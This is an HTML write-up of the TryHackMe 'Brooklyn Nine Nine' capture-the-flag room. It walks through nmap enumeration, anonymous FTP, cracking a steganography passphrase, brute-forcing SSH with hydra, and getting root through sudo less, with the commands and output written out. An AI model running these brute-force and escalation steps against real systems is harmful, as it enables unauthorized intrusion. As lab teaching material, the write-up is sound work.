<a href="https://tryhackme.com/room/brooklynninenine"><h1><center>Brooklyn Nine Nine</center></h1></a>
<p>There are two methods of getting into the machine and i will cover both in this write-up.</p>
<p>Without further ado let's start enumerating the machine! First we will use nmap scan. </p>
<pre><code>
$ nmap -sC -sV -oN nmap/init 10.10.48.118
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 17:05 EST
Nmap scan report for 10.10.48.118
Host is up (0.044s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.20.116
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.01 seconds
</code></pre>

<p>There are 3 ports open:</p>
<ul> 
  <li> 21 (FTP)</li>
  <li> 22 (SSH)</li>
  <li> 80 (HTTP)</li>
</ul>
<p>We can also see that FTP allows Anonymous login and has <code>note_to_jake.txt</code>! Let's login, download and check the file.</p>
<pre><code>
$ ftp 10.10.48.118
Connected to 10.10.48.118.
220 (vsFTPd 3.0.3)
Name (10.10.48.118:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.01 secs (19.5575 kB/s)
ftp> exit
221 Goodbye.
</code></pre>
<pre><code>
$ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
</code></pre>
<p>Nice! We can now note down 3 potencial usernames - Amy, Jake, Holt. But before we try to crack Jakes weak password lets check a web server on port 80.</p>
<p>Let's see if there is anything usefull in the source code...YEP... we found a clue!</p> 
<pre><code>
&lt;p&gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.&lt;/p&gt;
&lt;!-- Have you ever heard of steganography? --&gt;
</code></pre>
<p>Download the picture and let's see what it hides. </p>
<code> $ wget http://10.10.48.118/brooklyn99.jpg </code>

<p>Unfortunately we cant extract it with steghide because we dont have a password. Let's use a tool called <a href="https://github.com/Paradoxis/StegCracker">stegcracker</a> </p>
<pre><code>
# stegcracker brooklyn99.jpg /opt/wordlists/rockyou.txt 
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/opt/wordlists/rockyou.txt'..
Successfully cracked file with password: <b><---REDACTED---></b>
Tried 20522 passwords
Your file has been written to: brooklyn99.jpg.out
</pre></code>
<pre><code>
$ cat brooklyn99.jpg.out 
Holts Password:
<b><---REDACTED---></b>

Enjoy!!
</pre></code>
<p>Nice we got Holt's password and now all we got to do is ssh in!</p>
<h2>NOTE</h2>
<p>There is another way of getting into the machine. We know that Jake has weak password and we can use hydra to crack it</p>
<pre><code>
$ hydra -l jake -P /opt/wordlists/rockyou.txt 10.10.48.118 ssh
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
[DATA] attacking ssh://10.10.48.118:22/
[22][ssh] host: 10.10.48.118   login: jake   password: <b><---REDACTED---></b>
</code></pre>
<p>Now that we have covered how to get both credentials lets ssh in!</p>
<code>$ ssh jake@10.10.48.118 </code>
<p>We need to find <code>user.txt</code> and <code>root.txt</code>. </p>
<pre><code>
$ find / -type f -iname user.txt 2>/dev/null
/home/holt/user.txt
</code></pre>
<p> At this point we could just ssh in as Holt and get the flag but we need to escalate our privaleges to get the root flag anyways so lets get on with the fun part... Getting root access! </p>
<pre><code>
$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
</code></pre>
<p> So Jake can use <code>less</code> with sudo without password! We could just use <code>less</code> and get the contents of user and root flags but thats not fun! <p>
<p> Time to check <a href="https://gtfobins.github.io/">GTFOBins</a> and see if we can get root privaleges.</p> 
<p> Ahha there it is! First use:</p>
<code>
sudo less /etc/profile
</code>
<p> and then just type:</p>
<code> !/bin/sh </code>
<p> And thats it! But let's make sure we are root first.</p>
<pre><code>
# whoami
root
</code></pre>
<p> There we go we are root! That wasnt so hard was it?</p>
<pre><code>
# cat /home/holt/user.txt
<b><---REDACTED---></b>
</code></pre>
<p> And now the root flag.</p>
<pre><code>
# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <b><---REDACTED---></b>

Enjoy!!
</code></pre>

<p>And we are done! CONGRATS!</p>
<p>Don't forget to drink some water and happy hacking!</p>


